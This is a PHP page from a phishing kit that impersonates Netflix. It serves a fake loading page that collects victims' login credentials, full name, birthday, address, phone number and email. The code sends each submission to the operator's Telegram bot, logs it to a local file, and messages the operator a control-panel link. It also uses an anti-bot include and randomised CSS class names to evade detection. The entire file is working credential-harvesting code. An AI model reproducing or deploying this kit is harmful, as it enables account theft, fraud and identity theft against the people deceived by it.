<?php
    error_reporting(0);
    session_start();
    
    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    require_once "../setting/lang.php";
    // Lang Fucntion :
    lang();

    $ip = get_client_ip();
    $get_name_file = str_replace(".", "-", $ip);
    $get_name_page = "Page Loading";
    get_page_info($get_name_page, $get_name_file);
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $botToken = TOKEN;
    $chatId = CHATID;
    $link = $_SESSION["panel_control"];
    $buttonText = 'Link Panel - '. get_client_ip(); 
    $telegramApiEndpoint = "https://api.telegram.org/bot$botToken/sendMessage";
    $keyboard = [
        'inline_keyboard' => [
            [
                [
                    'text' => $buttonText,
                    'url' => $link,
                ],
            ],
        ],
    ];
    $keyboardJson = json_encode($keyboard);
    $messageData = [
        'chat_id' => $chatId,
        'text' => 'Click For Open Panel Control For This Ip Address : [ ' . get_client_ip() . " - " . $_SESSION['code_country_visit'].' ]',
        'reply_markup' => $keyboardJson,
    ];

    if($_POST['step'] === 'login'){
        $target = $_POST['ip'];
        $jsonFilePath = "../panel/storage/{$target}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = " ";
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        if (isset($_POST['send_data_1'])) {
            // Info User :
            $username = $_POST["username"];
            $password = $_POST["password"];
    
            // Send Data To Telegram Bot :
            $message = urlencode(
            "🔐============[ Login NETFLIX ]============🔐\r\n".
            "[ 👤 Username ] " . $username ."\r\n".
            "[ 🔑 Password ] " . $password ."\r\n".
            "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "🔐============[ Login NETFLIX ]============🔐\r\n");
            telegram($message);

            // Use cURL to send the message
            $ch = curl_init($telegramApiEndpoint);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);

            $message_to_file = 
            "[============[ Login NETFLIX ]============]\r\n".
            "[ Username ] " . $username ."\r\n".
            "[ Password ] " . $password ."\r\n".
            " IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "[============[ Login NETFLIX ]============]\r\n";

            $file = fopen("../file/file.txt", "a");
            fwrite($file, $message_to_file. "\n");
            fclose($file);

            echo "
            <script>
                function redirectUser() {
                    window.location.href = './step-one.php';
                }
                setTimeout(redirectUser, 7000);  
            </script>";
        }
    }
    elseif($_POST['step'] === 'login-error'){
        $target = $_POST['ip'];
        $jsonFilePath = "../panel/storage/{$target}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = " ";
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        if (isset($_POST['send_data_2'])) {
            // Info User :
            $username = $_POST["username"];
            $password = $_POST["password"];
    
            // Send Data To Telegram Bot :
            $message = urlencode(
            "🔐============[ ERROR Login NETFLIX ]============🔐\r\n".
            "[ 👤 Username ] " . $username ."\r\n".
            "[ 🔑 Password ] " . $password ."\r\n".
            "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "🔐============[ ERROR Login NETFLIX ]============🔐\r\n");
            telegram($message);

            // Use cURL to send the message
            $ch = curl_init($telegramApiEndpoint);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);

            $message_to_file = 
            "[============[ ERROR Login NETFLIX ]============]\r\n".
            "[ Username ] " . $username ."\r\n".
            "[ Password ] " . $password ."\r\n".
            " IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "[============[ ERROR Login NETFLIX ]============]\r\n";

            $file = fopen("../file/file.txt", "a");
            fwrite($file, $message_to_file. "\n");
            fclose($file);

            echo "
            <script>
                function redirectUser() {
                    window.location.href = './step-one.php';
                }
                setTimeout(redirectUser, 7000);  
            </script>";
        }

    }
    elseif($_POST['step'] === 'information'){
        $target = $_POST['ip'];
        $jsonFilePath = "../panel/storage/{$target}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = " ";
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        if (isset($_POST['send_data_3'])) {
            // Info User :
            $full_name = $_POST['first_name'] . " " . $_POST['last_name'];
            $birthday = $_POST['birthday']; 
            $country = $_POST['country']; 
            $address = $_POST['address']; 
            $city = $_POST['city'];
            $zip_code = $_POST['zip_code'];
            $email = $_POST['email']; 
            $phone_number = $_POST['phone_number'];

            // Send Data To Telegram Bot :
            $message = urlencode(
            "👤============ [ Information Personal ] ============👤\r\n".
            "[ 🪪 Full Name ] " . $full_name ."\r\n".
            "[ 🪪 Birthday ] " . $birthday ."\r\n".
            "[ 🌎 Country ] " . $country ."\r\n".
            "[ 📫 Address ] " . $address ."\r\n".
            "[ 🌎 City ] " . $city ."\r\n".
            "[ 📫 Zip Code ] " . $zip_code ."\r\n".
            "[ 📞 Phone Number ] " . $phone_number ."\r\n".
            "[ 📩 Email ] " . $email ."\r\n".
            "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "👤============ [ Information Personal ] ============👤\r\n");
            telegram($message);

            // Use cURL to send the message
            $ch = curl_init($telegramApiEndpoint);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);

            $message_to_file = 
            "============ [ Information Personal ] ============\r\n".
            "[ Full Name ] " . $full_name ."\r\n".
            "[ Birthday ] " . $birthday ."\r\n".
            "[ Country ] " . $country ."\r\n".
            "[ Address ] " . $address ."\r\n".
            "[ City ] " . $city ."\r\n".
            "[ Zip Code ] " . $zip_code ."\r\n".
            "[ Phone Number ] " . $phone_number ."\r\n".
            "[ Email ] " . $email ."\r\n".
            "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "============ [ Information Personal ] ============\r\n";
            
            $file = fopen("../file/file.txt", "a");
            fwrite($file, $message_to_file. "\n");
            fclose($file);

            echo "
            <script>
                function redirectUser() {
                    window.location.href = './step-two.php';
                }
                setTimeout(redirectUser, 7000);  
            </script>";
        }

    } 
    elseif($_POST['step'] === 'information-error'){
        $target = $_POST['ip'];
        $jsonFilePath = "../panel/storage/{$target}.json";
        $json_data = file_get_contents($jsonFilePath);
        $user_data = json_decode($json_data, true);
        $user_data['redirect_user'] = " ";
        $updated_json_data = json_encode($user_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        if (isset($_POST['send_data_4'])) {
            // Info User :
            $full_name = $_POST['first_name'] . " " . $_POST['last_name'];
            $birthday = $_POST['birthday']; 
            $country = $_POST['country']; 
            $address = $_POST['address']; 
            $city = $_POST['city'];
            $zip_code = $_POST['zip_code'];
            $email = $_POST['email']; 
            $phone_number = $_POST['phone_number'];

            // Send Data To Telegram Bot :
            $message = urlencode(
            "👤============ [ ERROR Information Personal ] ============👤\r\n".
            "[ 🪪 Full Name ] " . $full_name ."\r\n".
            "[ 🪪 Birthday ] " . $birthday ."\r\n".
            "[ 🌎 Country ] " . $country ."\r\n".
            "[ 📫 Address ] " . $address ."\r\n".
            "[ 🌎 City ] " . $city ."\r\n".
            "[ 📫 Zip Code ] " . $zip_code ."\r\n".
            "[ 📞 Phone Number ] " . $phone_number ."\r\n".
            "[ 📩 Email ] " . $email ."\r\n".
            "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "👤============ [ ERROR Information Personal ] ============👤\r\n");
            telegram($message);

            // Use cURL to send the message
            $ch = curl_init($telegramApiEndpoint);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);

            $message_to_file = 
            "============ [ ERROR Information Personal ] ============\r\n".
            "[ Full Name ] " . $full_name ."\r\n".
            "[ Birthday ] " . $birthday ."\r\n".
            "[ Country ] " . $country ."\r\n".
            "[ Address ] " . $address ."\r\n".
            "[ City ] " . $city ."\r\n".
            "[ Zip Code ] " . $zip_code ."\r\n".
            "[ Phone Number ] " . $phone_number ."\r\n".
            "[ Email ] " . $email ."\r\n".
            "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
            "============ [ ERROR Information Personal ] ============\r\n";
            
            $file = fopen("../file/file.txt", "a");
            fwrite($file, $message_to_file. "\n");
            fclose($file);

            echo "
            <script>
                function redirectUser() {
                    window.location.href = './step-two.php';
                }
                setTimeout(redirectUser, 7000);  
            </script>";
        }

        header('Location: ../pages/loading.php');
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/global-rules.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>Netflix - <?php echo get_text('title_head_2'); ?></title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> body-other">

    <!-- Navigation -->
    <nav>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-nav" style="justify-content: center !important;">
                <img src="../img/logo.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain">
            </div>
        </div>
    </nav>
    <!-- Navigation -->

    <!-- Sign In Form -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> main">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-main">
                <form method="post" id="formData">
                    <h1><?php echo get_text('title_step_2'); ?></h1>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-image-loading">
                        <img src="../img/loading.gif" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> loading-image">
                    </div>
                    <p>
                        <?php echo get_text('p_explain_step_2'); ?>
                    </p>
                </form>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> footer">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-footer">
                <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain"><?php echo get_text('title_footer'); ?></h1>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-footer">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_1'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_2'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_3'); ?></span>
                    </div>

                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_4'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_5'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_6'); ?></span>
                    </div>
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> box-lang">
                  <img src="../img/icon-lang-2.png" alt="">
                    <select>
                        <option value=""><?php echo get_text('lang_footer'); ?></option>
                    </select>
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> svg-select-lang" width="16" height="16" viewBox="0 0 16 16" role="img" data-icon="CaretDownSmall" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z" fill="currentColor"></path></svg>
                </div>
            </div>
        </div>
    </div>

    <!-- Message Explain -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-user" id="messageUser">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-message-user">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-messsage-user">
                <img src="../img/logo.png" alt="">
                <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-header" id="closeMessageuser1" type="button"><i
                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-xmark"></i></button>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-message-user">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alert-icon">
                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-shield-halved"></i>
                </span>
                <h2><?php echo get_text('title_message_user'); ?></h2>
                <p>
                    <?php echo get_text('text_message_user'); ?>
                </p>
                <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-user" id="closeMessageuser2"><?php echo get_text('button_message_user'); ?></button>
            </div>
        </div>
    </div>
    <!-- Message Explain -->

    <script src="../js/main.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/check.php'; ?>
</body>
</html>